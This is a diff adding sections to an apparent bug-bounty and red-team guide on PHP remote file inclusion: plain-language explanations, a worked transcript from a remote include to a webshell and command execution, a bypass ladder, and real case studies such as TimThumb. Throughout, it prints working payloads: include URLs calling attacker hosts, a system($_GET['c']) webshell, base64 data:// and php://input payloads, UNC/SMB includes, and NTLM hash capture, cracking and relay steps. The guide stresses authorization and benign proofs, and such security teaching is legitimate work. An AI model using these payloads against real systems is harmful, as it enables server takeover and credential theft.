@@ -44,6 +44,7 @@
 
 **PART III — EXPLOITATION BY IMPACT (where the money is)**
 11. [RFI → RCE → Shell (the whole point)](#11-rfi--rce--shell)
+    - [11.1 Full worked transcript — remote include → webshell → RCE (+ the `allow_url_include`-off fallback ladder)](#111-full-worked-transcript--remote-include--webshell--rce-and-the-allow_url_include-off-fallback-ladder)
 12. [Post-RCE: Proving Impact Safely & Pivoting](#12-post-rce-proving-impact-safely--pivoting)
 13. [Blind RFI & OOB Confirmation](#13-blind-rfi--oob-confirmation)
 14. [Other Stacks (JSP/ASP/ColdFusion/Node/Python)](#14-other-stacks)
@@ -56,6 +57,7 @@
 19. [Building a Professional, Safe PoC](#19-building-a-professional-safe-poc)
 20. [Reporting, CWE/CVSS & De-duplication](#20-reporting-cwecvss--de-duplication)
 21. [Automation & Red-Team Notes](#21-automation--red-team-notes)
+22. [Real-World Case Studies (Verified)](#22-real-world-case-studies-verified)
 
 **Appendices**
 - [Appendix A — RFI Workflow Cheat Sheet](#appendix-a--rfi-workflow-cheat-sheet)
@@ -126,6 +128,13 @@ The application includes a file whose location you influence, and that location 
 include($_GET['page'] . ".php");     // ?page=http://evil.com/shell.txt?  → includes & runs your PHP
 ```
 
+> 🔰 **In plain words — the anchor for this whole kit.** Picture `include()` as a **chef who doesn't just *read* a recipe card you hand them — they immediately *cook* whatever it says.** Normally the app hands the chef its own recipe cards (`home.php`, `about.php`). The whole bug is: **you get to hand the chef a recipe card from *your* address**, and your card says *"run this command on the server."* Because the chef **cooks** (executes) rather than merely reads, handing over your card = your code running on their machine = **instant full takeover (RCE), almost always Critical**.
+> - **LFI** (the sibling kit) = you can only hand the chef cards *already in the kitchen* (local files) — so you have to sneak your writing onto an existing card (log poisoning) to get code cooked.
+> - **RFI** (this kit) = you hand the chef a card straight from *your* house — no sneaking needed, your card is 100% your code.
+> - **The killer confusion — RFI vs SSRF:** SSRF is the chef merely *walking to your house to pick up the card* (a fetch — they never cook it). RFI is the chef actually *cooking from it*. You prove **cooking happened** — not just "my doorbell rang" — by putting something on the card that only *executing* it could produce (make it print `7*7*7` → if `343` comes back, real code ran). A request landing on your server is only the doorbell; the `343` is the meal.
+>
+> Keep this picture: every section is either "get your card to the chef" (make the include land — schemes, suffix-defeats, `data://`) or "prove the chef cooked it" (the computed marker → RCE).
+
 ## 2.2 RFI vs SSRF vs LFI (know which you have)
 ```
 RFI  → server INCLUDES/EXECUTES a remote/attacker file  → RCE.                 (this kit)
@@ -133,6 +142,8 @@ SSRF → server FETCHES your URL but doesn't execute it    → internal reach/cr
 LFI  → server includes/reads a LOCAL file               → disclosure or RCE via poisoning (LFI kit).
 ```
 The decision hinges on **execution**: does your hosted PHP *run* (RFI), or does the server merely *request* it (SSRF)?
+
+> **In plain words:** these three bugs all involve the app grabbing a file, and hunters constantly mislabel them — so burn this in. **RFI** = the chef *cooks your card from your house* → your code runs → RCE (this kit). **SSRF** = the chef only *walks over to fetch* a URL, never cooks it → you can make it visit internal servers/cloud-metadata but not run code (SSRF kit). **LFI** = the chef cooks a card *already in the kitchen* → disclosure, or RCE only if you first sneak your writing onto a local card (LFI kit). Same-looking symptom, three different payouts — and the tie-breaker is always the single question *"did my code actually execute?"*
 
 ## 2.3 Where RFI sinks live
 ```
@@ -171,6 +182,8 @@ The decision hinges on **execution**: does your hosted PHP *run* (RFI), or does 
 # 4. Baseline — Prove Inclusion *and Execution* (not just a fetch)
 
 **This is the crux.** You must distinguish "the server executed my file" (RFI) from "the server requested my URL" (SSRF).
+
+> **In plain words:** this is the make-or-break test, and it's dead simple: **did the chef cook, or just fetch?** You put a tiny bit of *arithmetic* on your card — `echo 7*7*7` — because a fetched file is copied verbatim (you'd see the literal text `7*7*7`), but a *cooked* one does the math and prints `343`. So point the include at your host and look at the response: `343` = your code ran = **RFI/RCE, Critical**. Raw `<?php echo 7*7*7 ?>` text shown = fetched-but-not-run (not RCE). Only a hit in your server logs with nothing special back = the chef just walked over = **SSRF, wrong kit.** Never call it RFI until you see the `343`.
 
 ## 4.1 The execution test
 Host a file that **computes** something only executing code can produce, then look for the result:
@@ -213,6 +226,7 @@ Benign payload to host first:
 ```php
 <?php echo "RFI-EXEC-".(7*7*7); /* benign proof: prints RFI-EXEC-343 */ ?>
 ```
+> **In plain words:** here's a subtlety that trips people up — **your own server must NOT cook the card; it has to hand it over raw.** If you name your file `shell.php` and put it on a PHP-capable server, *your* server runs it and the target receives boring HTML, not your source code. So serve it as **plain text** (a `.txt` file, `Content-Type: text/plain`) — that way your PHP travels intact to the target, and the *target's* chef is the one who cooks it. The `.txt` name also sets up the suffix-defeat trick in §6. `poc/payload_host.py` handles the text/plain part and logs every include hit.
 > **If this → then that:** your high port (8000) gets no hit but the program allows outbound 80/443 → re-host on **port 80/443**. If the response shows your raw PHP text (not the computed value), your file was included in a **non-executing** context → it's not RCE there; reassess (§4).
 
 ---
@@ -220,6 +234,8 @@ Benign payload to host first:
 # 6. Defeating the Forced Suffix (`?` / `#` / null)
 
 When the sink appends an extension (`include($_GET['page'].".php")`), neutralize it so your `.txt` still loads:
+
+> **In plain words:** many apps try to force the chef to only cook `.php` cards by *tacking `.php` onto whatever you say* — so your `http://evil/shell.txt` becomes `shell.txt.php`, which doesn't exist on your server. The fix is to make that forced `.php` **fall off the end into a part of the URL the server ignores.** Add a `?` (`shell.txt?`) and everything after it — including the `.php` — becomes the "query string," so the server still loads plain `shell.txt`. `#` (`%23`) does the same via the URL fragment; the legacy `%00` null byte chops it off on ancient PHP. The `?` trick is the single most reliable RFI defeat — try it first.
 ```
 Query-terminate:   ?page=http://YOUR_IP/shell.txt?          → server sees shell.txt?.php  (the ".php" becomes a query)
 Fragment:          ?page=http://YOUR_IP/shell.txt%23         → shell.txt#... (fragment dropped)   (%23 = #)
@@ -266,6 +282,8 @@ When the app insists the URL is "internal" or matches an allowed host:
 # 9. `data://` & `php://input` — RFI Without a Remote URL
 
 These give the RFI outcome (your code executes) **without** needing `allow_url_include` to fetch a remote URL — they often work where `http://` is refused. (Shared with the LFI kit §14.)
+
+> **In plain words:** modern PHP ships with the "fetch a card from a remote website" feature turned **off** by default (`allow_url_include=Off`), so classic `http://` RFI often fails — and beginners give up here. But there are ways to hand the chef your recipe *without any website at all.* `data://` lets you write the whole card **inline in the URL itself** (base64-encoded PHP) — no server to reach. `php://input` lets you put the card in the **body of your POST request** and point the include at that. `expect://` runs a command directly. These are the reason RFI is "still alive" on patched PHP, and they need nothing but the one vulnerable parameter — always try them the moment `http://` is refused.
 ```
 data:// (needs allow_url_include=On but no outbound fetch):
   ?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjJ10pOz8+&c=id
@@ -284,6 +302,8 @@ expect:// (expect extension):
 # 10. Windows UNC / SMB Includes
 
 On **Windows** PHP, an include of a **UNC path** pulls the file over SMB and executes it — and this does **not** require `allow_url_include`.
+
+> **In plain words:** on Windows, there's a back door that sidesteps the "remote URLs are off" setting entirely. Windows treats a network path like `\\YOUR_IP\share\shell.php` as if it were a *local* file — it quietly fetches it over the SMB file-sharing protocol and hands it to the chef. Because Windows thinks it's a normal local file (not a "remote URL"), `allow_url_include=Off` doesn't block it. So you run a fake file-share on your machine (`impacket-smbserver`), point the include at `\\YOUR_IP\share\shell.php`, and your PHP cooks on their server. The only requirement is that outbound SMB (port 445) is allowed — common inside corporate/internal networks (and §10.2 covers tunneling it over web ports when 445 is blocked).
 ```
 Sink:    include($_GET['page'])  on a Windows host
 Payload: ?page=\\YOUR_IP\share\shell.php           (URL-encoded: %5c%5cYOUR_IP%5cshare%5cshell.php)
@@ -294,6 +314,8 @@ Result:  the Windows PHP includes & executes shell.php over SMB → RCE. Capture
 
 ## 10.1 Even without execution: NTLM hash capture & relay (a second payoff)
 The instant a Windows host opens `\\YOUR_IP\share\...`, it **authenticates to your SMB server with the machine/service account** — **before** (and regardless of whether) the file executes. So a UNC include leaks the target's **NetNTLMv2 hash** even if `allow_url_include` is off **and** the file never runs:
+
+> **In plain words:** here's a bonus prize that pays even when the cooking fails. Windows is *polite* — the moment it reaches out to your file-share, it first **introduces itself with its login credentials** (a hashed form of the machine/service account's password), before it even looks at the file. So just by getting the server to touch `\\YOUR_IP\...`, you capture that password hash on your listener (Responder) — crack it offline (`hashcat -m 5600`) for the account's password, or *relay* it live to another internal service to run commands there. This means a Windows UNC include is worth reporting **even if `allow_url_include` is off and your `.php` never runs**: the forced "introduction" is itself an auth-coercion finding.
 ```
 □ CAPTURE: run Responder (or impacket-smbserver) → point the include at \\YOUR_IP\x → grab the NetNTLMv2 hash →
    crack offline (hashcat -m 5600) → the machine/service account's password.
@@ -320,6 +342,8 @@ If outbound **SMB/445** is filtered (common on cloud/hardened hosts), tunnel the
 # 11. RFI → RCE → Shell
 
 Once your remote file executes, you have RCE. Build up from benign proof to (authorized) shell:
+
+> **In plain words:** once the chef cooks your card, you own the server — but *prove it responsibly.* Climb one rung at a time: first the harmless arithmetic card (`echo 7*7*7` → `343`) to confirm cooking; then a card that runs a single read-only command (`system('id')`) to show real command execution. For a **bug-bounty report, stop there** — one `id`/`whoami` output *is* the Critical; you don't need a reverse shell, and dropping one adds legal/operational risk for zero extra bounty. A full interactive shell is only for **explicitly authorized red-team** work, and even then you clean up afterward.
 ```
 1. BENIGN PROOF (always first):   shell.txt = <?php echo "RFI-EXEC-".(7*7*7); ?>   → "RFI-EXEC-343" in response.
 2. COMMAND EXEC:                  shell.txt = <?php system($_GET['c']); ?>   → ?page=...shell.txt?&c=id  → uid output.
@@ -328,6 +352,68 @@ Once your remote file executes, you have RCE. Build up from benign proof to (aut
       (only with explicit authorization; prefer a single command-exec proof for bug bounty.)
 ```
 > **If this → then that:** the benign marker (`343`) returned → you have RCE; for a **bug-bounty report**, a single `system('id')`/`whoami` output is sufficient proof of Critical — you do **not** need a reverse shell (§19). For an authorized **red-team** engagement, escalate to a shell, then pivot (§12), and clean up.
+
+---
+
+## 11.1 Full worked transcript — remote include → webshell → RCE (and the `allow_url_include`-off fallback ladder)
+
+> **What this shows.** RFI's one defining move that LFI does *not* have: the app fetches and **executes code from a URL you control** — no local file to poison, no `php://filter` chain, just point the include at your server. This transcript runs it end-to-end on `https://shop.example` (`?page=` sink), and — because `allow_url_include` is **Off by default since PHP 5.2 and removed entirely in PHP 8** (§2, §9) — it then shows the exact **decision ladder** for when the naïve `http://` include is blocked. That ladder is the whole reason this kit is separate from LFI: it's the map of *when remote-include still lands*. Placeholders (`shop.example`, `atk.oast.pro`) are benign; the target is your own lab / an authorized instance.
+
+**Step 0 — recon the sink (§3).** A page-router parameter is the classic RFI sink:
+
+```
+$ curl -s 'https://shop.example/index.php?page=home'      # renders the "home" module — a router, likely include()
+$ curl -s 'https://shop.example/index.php?page=/etc/passwd' | head -1
+root:x:0:0:root:/root:/bin/bash                            # LOCAL file included → it's a file-inclusion sink (LFI/RFI)
+```
+
+**Step 1 — prove FETCH, but don't mistake it for RFI (§4).** Point the sink at a URL you control and watch your OAST logs. A hit proves the *server reached out* — that is **fetch = SSRF-grade**, not yet code execution:
+
+```
+# on your box: a listener/OAST that logs the request + serves PHP AS TEXT (never let your own PHP engine run it)
+$ curl -s 'https://shop.example/index.php?page=http://atk.oast.pro/probe.txt'
+# OAST log:  GET /probe.txt  from 203.0.113.9 (shop.example egress IP)   ← FETCH confirmed. Could still be SSRF only.
+```
+
+> **The fetch-vs-execute rule (the #1 triage question, §4/§15).** A callback alone is **not** RFI — it's SSRF until the *content you served executes*. The next step is what separates a Critical RFI from a Medium SSRF.
+
+**Step 2 — prove EXECUTION (this is the RFI).** Serve a PHP file **as `text/plain`** (so only the *target* executes it) whose body is a benign arithmetic marker, include it, and look for the *computed* result in the response:
+
+```
+# atk.oast.pro/p.txt  →   <?php echo "RFI-EXEC-".(7*7*7); ?>        (served as text/plain)
+$ curl -s 'https://shop.example/index.php?page=http://atk.oast.pro/p.txt%00'   # %00/?/# to kill a forced .php suffix (§6)
+...RFI-EXEC-343...          ← the server COMPUTED 7*7*7. That is remote code execution. Critical. allow_url_include is ON.
+```
+
+**Step 3 — RCE proof, then STOP (§11/§12).** Swap the marker for one read-only command; one `id` is the whole Critical:
+
+```
+# atk.oast.pro/p.txt  →   <?php system("id"); ?>
+$ curl -s 'https://shop.example/index.php?page=http://atk.oast.pro/p.txt%00'
+uid=33(www-data) gid=33(www-data) groups=33(www-data)      ← RCE proven. Report this. No shell needed for bounty.
+```
+
+**Step 4 — the fallback ladder: when `http://` include is BLOCKED.** In 2025 most PHP is 7.x/8.x with `allow_url_include=Off` — Step 2 returns the raw source or an error instead of `343`. Don't give up; walk this ladder *in order*, because each rung has different prerequisites:
+
+```
+IF the http:// include did NOT execute →
+ ├─ Is allow_url_include ON but a WORD-FILTER blocked "http"?  → §7/§8 bypasses:
+ │     • allowlist-substring bug:  http://TRUSTED.atk.oast.pro/p.txt   (trusted string anywhere in host — this is the TimThumb bug, §22)
+ │     • scheme/case/encoding:     hTTp://, http:\\, %68%74%74%70, ftp://, //atk.oast.pro/p.txt
+ │
+ ├─ allow_url_include ON, no reachable HTTP host (egress-filtered)? → NO remote host needed (§9):
+ │     • data://       ?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCJpZCIpOz8+   (PHP payload inline, base64)
+ │     • php://input   ?page=php://input   + POST body: <?php system("id"); ?>       (the include body IS your POST)
+ │
+ ├─ allow_url_include OFF but target is WINDOWS? → UNC/SMB is a FILESYSTEM path, NOT gated by allow_url_include (§10):
+ │     • ?page=\\atk.oast.pro\share\shell.php     → executes over SMB  (AND leaks a NetNTLM hash to your responder → relay, §10.1)
+ │     • SMB/445 egress blocked?  → WebDAV over 80/443:  ?page=\\atk.oast.pro@80\dav\shell.php   (§10.2)
+ │
+ └─ allow_url_include OFF and target is LINUX? → true remote include is dead here. PIVOT to the LFI kit:
+       the same ?page= sink is a LOCAL file-inclusion → php://filter source-read / log-poisoning / session RCE (../LFI/).
+```
+
+> **Why this ladder is the point of the kit.** LFI owns "`../` → `include()` local file → RCE via poisoning". RFI owns *this*: **execute a URL/wrapper/UNC-path you control**. The moment you can't get remote execution on a Linux `allow_url_include=Off` box, you're no longer doing RFI — you hand the *same sink* to the LFI kit and win locally. Knowing which rung you're on is knowing which kit pays.
 
 ---
 
@@ -521,6 +607,29 @@ ffuf -u "https://target/?page=http://YOUR_IP:8000/shell.txt?FUZZ" -w suffixes.tx
 □ Chain: open redirect (allowed host) → RFI past the allowlist → RCE.
 □ RFI read of config → DB/cloud creds → cloud takeover (SSRF kit discipline).
 ```
+
+---
+
+# 22. Real-World Case Studies (Verified)
+
+> RFI's history *is* its severity argument: for a decade it was the fastest path from one URL parameter to a mass-owned server farm. These are real, documented cases — each one maps to a technique in this guide so you can see the payload behind the headline.
+
+**① TimThumb — one image script, ~1.2 million WordPress sites (2011, CVE-2011-4106). The allowlist-bypass case (§8).**
+`timthumb.php` — a tiny image resize/crop script bundled into *hundreds* of WordPress themes and plugins — fetched remote images and cached them locally. It "restricted" the source to a hardcoded list of trusted hosts (`blogger.com`, `flickr.com`, `picasa.com`, `img.youtube.com`, `wordpress.com`)… but the check matched the trusted string **anywhere in the hostname**. So `http://blogger.com.attacker.com/shell.php` (or `picasa.com.zataz.com`) passed the allowlist, and TimThumb happily downloaded the attacker's PHP into its web-served cache directory → **RCE**. Disclosed by **Mark Maunder** in August 2011; attackers used it for **botnet recruitment** and it was used to compromise **~1.2 million sites**, exploited in the wild for years. Fixed in v1.34. *This is exactly the §8 allowlist-substring bug — `TRUSTED.attacker.com` — in the fallback ladder above.*
+→ *Technique:* §8 allowlist/domain-filter bypass. *Impact:* mass RCE. *Lesson:* a substring allowlist is not an allowlist.
+*Source:* [Invicti — timthumb.php RCE (CVE-2011-4106)](https://www.invicti.com/web-application-vulnerabilities/timthumb-php-remote-code-execution) · [Dark Reading — TimThumb compromises 1.2M sites](https://www.darkreading.com/application-security/hackers-timthumb-their-noses-at-vulnerability-to-compromise-1-2-million-sites) · [Eric Romang — TimThumb RFI as botnet vector](https://eromang.zataz.com/2011/09/20/wordpress-timthumb-rfi-vulnerability-used-as-botnet-recruitment-vector/)
+
+**② The `allow_url_include` era — why classic `http://` RFI is (mostly) history (§2, §9).**
+`allow_url_include` — the switch that lets `include()`/`require()` pull code from a **URL** — has been **`Off` by default since PHP 5.2.0 (2006)**, and it *requires* `allow_url_fopen=On` as well. It was **deprecated in PHP 7.4** and **removed entirely in PHP 8.0** (a `1` value now just errors). That single default is why naïve `?page=http://evil/shell.txt` mostly stopped working after ~2007 and RFI reports plummeted. The takeaway isn't "RFI is dead" — it's *"RFI moved"*: on a modern box you win through **`data://` / `php://input`** (when the flag is somehow on, §9), **Windows UNC/SMB** (a filesystem path, not gated by the flag, §10), a **legacy PHP 5.x app** (still everywhere in the long tail), or you **hand the sink to LFI** (§11.1 ladder). Know the version, know the rung.
+→ *Technique:* §9 wrappers / §10 UNC / §11.1 ladder. *Lesson:* the config default, not the code, decides which RFI primitive lands.
+*Source:* [PHP Manual — `allow_url_include` (deprecated 7.4)](https://www.php.net/manual/en/filesystem.configuration.php#ini.allow-url-include) · [PHP RFC — Deprecations for PHP 7.4](https://wiki.php.net/rfc/deprecations_php_7_4)
+
+**③ Windows `data://`/`php://input` & UNC — RFI without a reachable HTTP host (§9–§10).**
+Two documented realities keep RFI alive where the naïve remote include fails. (a) When `allow_url_include` is on but egress is filtered, **`php://input`** turns your *POST body* into the included file and **`data://text/plain;base64,…`** inlines the PHP payload — no attacker host needed (both catalogued in PayloadsAllTheThings' File Inclusion notes). (b) On **Windows** PHP, an include of a **UNC path** `\\attacker\share\shell.php` is treated as an ordinary *file path*, so it executes **regardless of `allow_url_include`** — and the SMB handshake leaks a **NetNTLM** hash to a listening `Responder`, giving you a *second* payoff (crack or relay) even if code execution is blocked. If SMB/445 is filtered outbound, the same trick runs over **WebDAV on 80/443**.
+→ *Technique:* §9 (`data://`/`php://input`), §10 (UNC + NTLM capture), §10.2 (WebDAV). *Lesson:* "no remote host" and "flag is off" are not dead-ends.
+*Source:* [PayloadsAllTheThings — File Inclusion](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion) · [Mannu Linux — Exploiting RFI & bypassing remote-URL restrictions](https://www.mannulinux.org/2019/05/exploiting-rfi-in-php-bypass-remote-url-inclusion-restriction.html)
+
+**④ The meta-lesson (why RFI still matters despite the default).** Every live RFI today is a *legacy* thing — a PHP 5.x app nobody upgraded, a bundled script like TimThumb nobody patched, a Windows box where the flag is irrelevant, or a developer who explicitly set `allow_url_include=On` for a "feature." RFI reports are rarer than LFI now, which cuts *both* ways: fewer to find, but the ones you find are **less-duped Criticals** — and the Recon kit's legacy-surface hunting (old CMS plugins, `?page=`/`?file=`/`?template=` params in archived URLs) is where they hide.
 
 ---
 
